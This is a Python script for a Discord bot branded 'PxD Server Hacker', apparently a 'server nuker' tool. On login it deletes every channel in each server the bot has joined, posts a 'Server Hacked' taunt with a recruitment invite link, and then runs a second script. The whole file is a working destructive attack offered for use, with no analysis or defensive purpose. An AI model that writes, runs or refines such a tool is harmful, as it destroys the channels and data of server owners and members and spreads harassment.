import discord
import asyncio
from pystyle import *
import platform
import subprocess
import os

def run_another_script(script_path):
    if platform.system() == "Windows":
        subprocess.call(["python", script_path], shell=True)
    else:
        subprocess.call(["python3", script_path])

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')




banner = '''


   ____       ____    ____                             _   _            _             
 |  _ \__  _|  _ \  / ___|  ___ _ ____   _____ _ __  | | | | __ _  ___| | _____ _ __ 
 | |_) \ \/ / | | | \___ \ / _ \ '__\ \ / / _ \ '__| | |_| |/ _` |/ __| |/ / _ \ '__|
 |  __/ >  <| |_| |  ___) |  __/ |   \ V /  __/ |    |  _  | (_| | (__|   <  __/ |   
 |_|   /_/\_\____/  |____/ \___|_|    \_/ \___|_|    |_| |_|\__,_|\___|_|\_\___|_|   
                                                                                                                                                                                                                                                      
                                                                                                                                                                  
                                                                                                                                                            
'''


intents = discord.Intents.default()
intents.typing = False
intents.presences = False

bot = discord.Client(intents=intents)

async def delete_channels(guild):
    tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*tasks)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name} - {bot.user.id}")
    for guild in bot.guilds:
        await delete_channels(guild)
        guidelines_channel = await guild.create_text_channel("pxd")
        target_channel = discord.utils.get(guild.text_channels, name="pxd")
        if target_channel:
            embed = discord.Embed(
                title="Server Hacked",
                description="PxD Sec just hacked your ass (L)",
                color=discord.Color.red()
            )
            embed.add_field(name="PXD-SEC", value="[Click Here](https://discord.gg/XTD3MFtXwq)", inline=False)
            await target_channel.send(embed=embed)
            script_path = "main.py"  
        run_another_script(script_path)
print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))
bot.run(input("Enter your bot token: "))
